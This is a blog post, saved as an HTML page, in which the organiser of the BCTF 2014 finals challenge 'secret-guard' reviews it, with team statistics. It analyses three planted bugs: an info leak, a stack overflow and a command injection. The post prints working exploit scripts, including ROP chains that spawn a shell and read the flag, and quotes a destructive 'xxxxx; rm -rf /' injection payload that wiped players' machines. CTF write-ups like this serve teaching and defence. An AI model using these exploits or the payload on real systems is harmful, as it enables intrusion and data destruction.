@@ -1,0 +1,667 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>BCTF 2014 决赛题 - Secret Guard 回顾与分析 - From Zero To X</title>
+  <meta name="author" content="zTrix">
+
+  
+  <meta name="description" content="BCTF 2014 finals secret-guard writeup">
+  <meta name="keywords" content="ctf,bctf,writeup">
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://blog.ztrix.me/blog/2014/05/07/bctf-secret-guard">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/stylesheets/data-table.css" media="screen, projection" rel="stylesheet" type="text/css" />
+  <link href="/atom.xml" rel="alternate" title="From Zero To X" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+  <script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', 'UA-10996727-4']);
+    _gaq.push(['_trackPageview']);
+
+    (function() {
+      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+  </script>
+
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">From Zero To X</a></h1>
+  
+    <h2>zTrix's Blog</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="http://google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:blog.ztrix.me" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">BCTF 2014 决赛题 - Secret Guard 回顾与分析</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+<time datetime="2014-05-07T09:08:55+08:00" pubdate data-updated="true">2014-05-07</time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>by <code>zTrix@blue-lotus</code></p>
+
+<p>secret-guard 作为 BCTF 2014 决赛中最简单的一道 binary 题目，设计目标为，能够在放出后 4 个小时左右被各队逐渐解出，达到一波得分高潮。漏洞设置方面，设置了 3 个不同类型的简单漏洞，分别属于信息泄露、栈溢出和命令注入，期望是各个队伍发现不同的漏洞，达到互有攻防，反复抢占阵地的激烈效果。</p>
+
+<p>根据比赛的实际情况来看，题目足够简单，作为最简单的 binary 题目，4 个小时内被解出的目标完成了，但是没有想到的是，在很长的一段时间内，只有 HITCON 217 一个队伍解出这道简单题目，并且只利用了其中命令注入的最简单漏洞。赛后的交流得知，开始时很多人以为每个题目只有一个漏洞，于是找到漏洞之后，就去看别的题目了，没有再仔细研究这个题目。另外，不知道是由于此题攻击流量分析较为困难还是各个队伍经验较少的原因，所有其他队伍一直处于被打状态而没有及时修补，导致得分差距太大，所以总体感觉甚为惋惜，花费心思设置的各个漏洞和坑点大家都没有遇到，也没有达到预期的效果。</p>
+
+<h2>关于这题的一些统计信息</h2>
+
+<!-- more -->
+
+
+<table>
+<thead>
+<tr>
+<th></th>
+<th> 队伍     </th>
+<th align="center">      攻击次数      </th>
+<th align="center">  被攻击次数 </th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+<td> HITCON 217    </td>
+<td align="center"> 716 </td>
+<td align="center"> 0   </td>
+</tr>
+<tr>
+<td></td>
+<td> 0ops          </td>
+<td align="center"> 379 </td>
+<td align="center"> 12  </td>
+</tr>
+<tr>
+<td></td>
+<td> DISA          </td>
+<td align="center"> 307 </td>
+<td align="center"> 79  </td>
+</tr>
+<tr>
+<td></td>
+<td> Light4Freedom </td>
+<td align="center"> 229 </td>
+<td align="center"> 575 </td>
+</tr>
+<tr>
+<td></td>
+<td> Pax.Mac Team  </td>
+<td align="center"> 197 </td>
+<td align="center"> 91  </td>
+</tr>
+<tr>
+<td></td>
+<td> Sigma         </td>
+<td align="center"> 137 </td>
+<td align="center"> 86  </td>
+</tr>
+<tr>
+<td></td>
+<td> 我是狗汪汪    </td>
+<td align="center"> 87  </td>
+<td align="center"> 661 </td>
+</tr>
+<tr>
+<td></td>
+<td> 无名          </td>
+<td align="center"> 284 </td>
+<td align="center"> 116 </td>
+</tr>
+</tbody>
+</table>
+
+
+<br/>
+
+
+<h2>总体服务状态</h2>
+
+<ul>
+<li>1 &ndash; down</li>
+<li>31 &ndash; error</li>
+<li>1597 &ndash; ok</li>
+</ul>
+
+
+<h2>漏洞分析</h2>
+
+<p>首先要看懂程序逻辑，作为 secret guard，它打开的第一个秘密文件其实就是 flag 文件。并且将 flag 的前一半作为 secret key。每次连接服务，可以给一个随机数种子，然后获得 secret key 中的一个 byte。</p>
+
+<p>随后，程序会向用户询问 16 个关于 secret key 的问题，如果全部答对，才能得到 access 权限。</p>
+
+<p>取得权限之后，用户可以输入一个 pid，然后程序会调用 lsof 命令，打印出这个 pid 打开的秘密文件有哪些。</p>
+
+<h3>漏洞一 &ndash; 任意信息泄露漏洞</h3>
+
+<p>首先，随机数种子确定的时候，随机数的序列是固定的。因此很容易找到一个序列，让他们作为随机种子之后，随机得到 0 1 2 &hellip; 15 的序列。有了这个序列之后，是可以轻松获得 flag 的前面一半的。</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c"># http://github.com/zTrix/zio</span>
+</span><span class='line'><span class="kn">from</span> <span class="nn">zio</span> <span class="kn">import</span> <span class="o">*</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">get_char</span><span class="p">(</span><span class="n">p</span><span class="p">):</span>
+</span><span class='line'>    <span class="n">io</span> <span class="o">=</span> <span class="n">zio</span><span class="p">((</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">),</span> <span class="n">print_write</span> <span class="o">=</span> <span class="n">COLORED</span><span class="p">(</span><span class="n">REPR</span><span class="p">))</span>
+</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;sneak peek&#39;</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;here: &#39;</span><span class="p">)</span>
+</span><span class='line'>    <span class="n">line</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span>
+</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span><span class='line'>    <span class="k">return</span> <span class="n">line</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">get_flag_first_half</span><span class="p">():</span>
+</span><span class='line'>    <span class="n">tbl</span> <span class="o">=</span> <span class="p">[</span><span class="mi">12</span><span class="p">,</span> <span class="mi">65</span><span class="p">,</span> <span class="mi">22</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">36</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">23</span><span class="p">,</span> <span class="mi">10</span><span class="p">]</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="n">half</span> <span class="o">=</span> <span class="p">[]</span>
+</span><span class='line'>    <span class="k">for</span> <span class="n">s</span> <span class="ow">in</span> <span class="n">tbl</span><span class="p">:</span>
+</span><span class='line'>        <span class="n">half</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">get_char</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">s</span><span class="p">)))</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="k">return</span> <span class="s">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">half</span><span class="p">)</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>仔细分析可以发现，0x401480(sneak_peek) 这个函数是有溢出漏洞的，除了 <code>\r \n</code> 之外，可以覆盖其他任意字符到栈上高位。但是这个函数有 stack canary 保护，因此没法直接利用 return address 来控制 EIP。不过这个 stack frame 内部的变量是可以任意覆盖的，只要变量的地址在 buf 和 canary 之间。进一步分析，可以发现，获取随机种子之后，程序会打印出栈上某个指针所指字符串的一个字母，而这个指针是可以覆盖的。</p>
+
+<p>原始代码如下，也就是下面的 <code>big_secret</code> 是可以覆盖的，于是可以直接把这个变量覆盖成 <code>flag_bss</code>，从而泄漏一个字节。总共 32 次就可以泄漏完整的 flag</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='cpp'><span class='line'><span class="n">srand</span><span class="p">(</span><span class="n">seed</span><span class="p">);</span>
+</span><span class='line'><span class="n">p</span> <span class="o">=</span> <span class="n">rand</span><span class="p">()</span> <span class="o">%</span> <span class="n">len</span><span class="p">;</span>
+</span><span class='line'><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Your piece of secret here: %c</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">big_secret</span><span class="p">[</span><span class="n">p</span><span class="p">]);</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>第一个漏洞的攻击代码如下：</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">flag_bss</span> <span class="o">=</span> <span class="mh">0x402420</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">pwn1</span><span class="p">():</span>
+</span><span class='line'>    <span class="n">flag</span> <span class="o">=</span> <span class="p">[]</span>
+</span><span class='line'>    <span class="k">for</span> <span class="n">index</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">32</span><span class="p">):</span>
+</span><span class='line'>        <span class="n">ad</span> <span class="o">=</span> <span class="n">flag_bss</span> <span class="o">+</span> <span class="n">index</span>
+</span><span class='line'>        <span class="n">seed</span> <span class="o">=</span> <span class="mi">12</span>
+</span><span class='line'>        <span class="k">if</span> <span class="n">ad</span> <span class="o">&amp;</span> <span class="mh">0xff</span> <span class="ow">in</span> <span class="p">(</span><span class="mh">0xd</span><span class="p">,</span> <span class="mh">0xa</span><span class="p">):</span>
+</span><span class='line'>            <span class="n">seed</span> <span class="o">=</span> <span class="mi">65</span>
+</span><span class='line'>            <span class="n">ad</span> <span class="o">-=</span> <span class="mi">1</span>
+</span><span class='line'>        <span class="n">p</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">seed</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39; &#39;</span> <span class="o">*</span> <span class="mi">14</span> <span class="o">+</span> <span class="n">l64</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">+</span> <span class="n">l64</span><span class="p">(</span><span class="n">ad</span><span class="p">)</span>
+</span><span class='line'>        <span class="n">flag</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">get_char</span><span class="p">(</span><span class="n">p</span><span class="p">))</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="k">return</span> <span class="s">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>这个漏洞与 openssl heartbleed 漏洞有几分相似，可以泄漏内存中任意地址信息，每次一个 byte，效率略低，但是对于 flag 来说足够了。</p>
+
+<p>这个漏洞的修补并不困难，buffer 读入的时候，检查一下大于 16 就退出循环即可。</p>
+
+<h3>漏洞二 &ndash; 栈溢出漏洞</h3>
+
+<p>在程序问 16 个问题的函数中，存在第二个漏洞，并且是一个裸的 buffer overflow 漏洞。每次回答问题的输入，会被 gets 函数读入，而 gets 是一个非常危险的函数。</p>
+
+<p>这个漏洞比较简单，直接构造 ROP chain 打印 flag 即可。注意 <code>printf</code> 进入之前需要 al 寄存器设置为 0，否则会崩溃，具体原因没有深究，<code>0x400f10</code> 是一个返回值为 0 的函数，可以用来设置 rax 为 0.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c"># http://github.com/zTrix/zio</span>
+</span><span class='line'><span class="kn">from</span> <span class="nn">zio</span> <span class="kn">import</span> <span class="o">*</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">pwn2</span><span class="p">():</span>
+</span><span class='line'>    <span class="n">io</span> <span class="o">=</span> <span class="n">zio</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">print_write</span> <span class="o">=</span> <span class="n">COLORED</span><span class="p">(</span><span class="n">REPR</span><span class="p">),</span> <span class="n">timeout</span> <span class="o">=</span> <span class="mi">10000</span><span class="p">,</span> <span class="n">write_delay</span> <span class="o">=</span> <span class="mi">0</span><span class="p">)</span>
+</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;sneak peek&#39;</span><span class="p">)</span>
+</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="s">&#39;s&#39;</span><span class="p">)</span>
+</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;to access:&#39;</span><span class="p">)</span>
+</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;?&#39;</span><span class="p">)</span>
+</span><span class='line'>    <span class="n">pop_ret</span> <span class="o">=</span> <span class="mh">0x00401a63</span>
+</span><span class='line'>    <span class="n">system</span> <span class="o">=</span> <span class="mh">0x400d70</span>
+</span><span class='line'>    <span class="n">printf</span> <span class="o">=</span> <span class="mh">0x400c60</span>
+</span><span class='line'>    <span class="n">gets</span> <span class="o">=</span> <span class="mh">0x400da0</span>
+</span><span class='line'>    <span class="n">scanf</span> <span class="o">=</span> <span class="mh">0x400d40</span>
+</span><span class='line'>    <span class="n">strlen</span> <span class="o">=</span> <span class="mh">0x402258</span>
+</span><span class='line'>    <span class="c"># io.gdb_hint()</span>
+</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="s">&#39;_&#39;</span> <span class="o">*</span> <span class="mi">16</span> <span class="o">+</span> <span class="s">&#39;AAAA&#39;</span> <span class="o">+</span> <span class="n">l64</span><span class="p">(</span><span class="mh">0x1</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="n">l64</span><span class="p">(</span><span class="n">flag_bss</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">8</span> <span class="o">+</span> <span class="s">&#39;B&#39;</span> <span class="o">*</span> <span class="mi">8</span> <span class="o">+</span> <span class="n">l64</span><span class="p">(</span><span class="mh">0x400f10</span><span class="p">)</span> <span class="o">+</span> <span class="n">l64</span><span class="p">(</span><span class="n">pop_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">l64</span><span class="p">(</span><span class="n">flag_bss</span><span class="p">)</span> <span class="o">+</span> <span class="n">l64</span><span class="p">(</span><span class="n">printf</span><span class="p">)</span> <span class="o">+</span> <span class="n">l64</span><span class="p">(</span><span class="n">scanf</span><span class="p">))</span>
+</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">print_read</span> <span class="o">=</span> <span class="n">REPR</span>
+</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>如果想从这个漏洞拿 shell，就需要泄漏一次地址再跳回程序，利用稍微麻烦一点</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c"># http://github.com/zTrix/zio</span>
+</span><span class='line'><span class="kn">from</span> <span class="nn">zio</span> <span class="kn">import</span> <span class="o">*</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">pwn3</span><span class="p">():</span>
+</span><span class='line'>    <span class="n">io</span> <span class="o">=</span> <span class="n">zio</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">print_write</span> <span class="o">=</span> <span class="n">COLORED</span><span class="p">(</span><span class="n">REPR</span><span class="p">),</span> <span class="n">timeout</span> <span class="o">=</span> <span class="mi">10000</span><span class="p">,</span> <span class="n">write_delay</span> <span class="o">=</span> <span class="mi">0</span><span class="p">)</span>
+</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;sneak peek&#39;</span><span class="p">)</span>
+</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="s">&#39;s&#39;</span><span class="p">)</span>
+</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;to access:&#39;</span><span class="p">)</span>
+</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;?&#39;</span><span class="p">)</span>
+</span><span class='line'>    <span class="n">pop_ret</span> <span class="o">=</span> <span class="mh">0x00401a63</span>
+</span><span class='line'>    <span class="n">system</span> <span class="o">=</span> <span class="mh">0x400d70</span>
+</span><span class='line'>    <span class="n">printf</span> <span class="o">=</span> <span class="mh">0x400c60</span>
+</span><span class='line'>    <span class="n">gets</span> <span class="o">=</span> <span class="mh">0x400da0</span>
+</span><span class='line'>    <span class="n">scanf</span> <span class="o">=</span> <span class="mh">0x400d40</span>
+</span><span class='line'>    <span class="n">strlen</span> <span class="o">=</span> <span class="mh">0x402258</span>
+</span><span class='line'>    <span class="n">answer</span> <span class="o">=</span> <span class="mh">0x401710</span>
+</span><span class='line'>    <span class="n">init</span> <span class="o">=</span> <span class="mh">0x400f10</span>
+</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="s">&#39;_&#39;</span> <span class="o">*</span> <span class="mi">16</span> <span class="o">+</span> <span class="s">&#39;AAAA&#39;</span> <span class="o">+</span> <span class="n">l64</span><span class="p">(</span><span class="mh">0x1</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="n">l64</span><span class="p">(</span><span class="n">flag_bss</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">8</span> <span class="o">+</span> <span class="s">&#39;B&#39;</span> <span class="o">*</span> <span class="mi">8</span> <span class="o">+</span> <span class="n">l64</span><span class="p">(</span><span class="n">init</span><span class="p">)</span> <span class="o">+</span> <span class="n">l64</span><span class="p">(</span><span class="n">pop_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">l64</span><span class="p">(</span><span class="n">strlen</span><span class="p">)</span> <span class="o">+</span> <span class="n">l64</span><span class="p">(</span><span class="n">printf</span><span class="p">)</span> <span class="o">+</span> <span class="n">l64</span><span class="p">(</span><span class="n">pop_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">l64</span><span class="p">(</span><span class="n">flag_bss</span><span class="p">)</span> <span class="o">+</span> <span class="n">l64</span><span class="p">(</span><span class="n">answer</span><span class="p">))</span>
+</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">print_read</span> <span class="o">=</span> <span class="n">REPR</span>
+</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span>
+</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span>
+</span><span class='line'>    <span class="n">addr</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
+</span><span class='line'>    <span class="n">strlen_libc</span> <span class="o">=</span> <span class="n">l64</span><span class="p">(</span><span class="n">addr</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">&#39;</span><span class="se">\x00</span><span class="s">&#39;</span><span class="p">))</span>
+</span><span class='line'>    <span class="n">libc_base</span> <span class="o">=</span> <span class="n">strlen_libc</span> <span class="o">-</span> <span class="mh">0x81c40</span>
+</span><span class='line'>    <span class="n">binsh</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mi">1443474</span>
+</span><span class='line'>    <span class="n">log</span><span class="p">(</span><span class="s">&#39;addr = </span><span class="si">%s</span><span class="s">, strlen_libc = </span><span class="si">%x</span><span class="s">, libc_base = </span><span class="si">%x</span><span class="s">, binsh = </span><span class="si">%x</span><span class="s">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="nb">repr</span><span class="p">(</span><span class="n">addr</span><span class="p">),</span> <span class="n">strlen_libc</span><span class="p">,</span> <span class="n">libc_base</span><span class="p">,</span> <span class="n">binsh</span><span class="p">),</span> <span class="s">&#39;red&#39;</span><span class="p">)</span>
+</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span>
+</span><span class='line'>    <span class="c"># io.gdb_hint()</span>
+</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="s">&#39;_&#39;</span> <span class="o">*</span> <span class="mi">16</span> <span class="o">+</span> <span class="s">&#39;AAAA&#39;</span> <span class="o">+</span> <span class="n">l64</span><span class="p">(</span><span class="mh">0x1</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="n">l64</span><span class="p">(</span><span class="n">flag_bss</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">8</span> <span class="o">+</span> <span class="s">&#39;B&#39;</span> <span class="o">*</span> <span class="mi">8</span> <span class="o">+</span> <span class="n">l64</span><span class="p">(</span><span class="n">pop_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">l64</span><span class="p">(</span><span class="n">binsh</span><span class="p">)</span> <span class="o">+</span> <span class="n">l64</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>
+</span><span class='line'>    <span class="n">flag</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span>
+</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="s">&#39;cat /home/flags/secret-guard/flag; exit;&#39;</span><span class="p">)</span>
+</span><span class='line'>    <span class="c"># flag = io.readline()</span>
+</span><span class='line'>    <span class="n">flag</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span><span class='line'>    <span class="k">return</span> <span class="n">flag</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>这个漏洞的修补更加简单，直接把 gets 改成 getchar 即可，但是换行可能会吃掉导致逻辑错误，因此可能需要两个 getchar</p>
+
+<h3>漏洞三 &ndash; 命令注入漏洞</h3>
+
+<p>漏洞三就是比赛队伍一直在利用的 shell injection 漏洞。原理和利用都比较简单，这里就不再赘述了。设计这个漏洞的时候，因为太过简单，就把它放在了程序最后，具有一定的隐蔽性。因此可能造成了不少队伍很晚才发现这个漏洞。</p>
+
+<p>当初设计这个漏洞，同时还有两个目的：</p>
+
+<ul>
+<li>纪念 <a href="http://weibo.com/d34dc47">D3AdCa7</a> 童鞋去年 defcon 决赛中，因为写了未加检查的 curl 提交 flag 脚本，因此被别人 flag 中的 <code>xxxxx; rm -rf /</code> 删除了整个系统。好在由于权限原因，重要的个人文件资料并未删除。</li>
+<li>提醒大家重视 shell injection，特别是 shell 脚本中，很容易未加检查就信任输入，造成 injection。</li>
+</ul>
+
+
+<p>比较巧合的事情是，<a href="http://weibo.com/d34dc47">D3AdCa7</a>  童鞋的 defcon 遭遇居然在这次决赛中又重演了，而且，就是在这个我设置了 shell injection 漏洞的地方，本意是提醒大家，结果有的队伍直接修改返回为 <code>xxxxx; rm -rf /</code>，我发现这个问题的时候，立刻过去要求他们去掉，恶作剧一下即可，如果真造成损失就不好了，但是没想到当时就已经有其他队伍中招了，并且是不止一个队员。</p>
+
+<p>不知道中招情况如何，但是感觉题目本意想达到的提醒大家注意 shell injection 漏洞的效果被这次意外完成了，无论是中招的童鞋，还是事后谈论的童鞋，应该都会有所防范吧。</p>
+
+<h2>题目总结</h2>
+
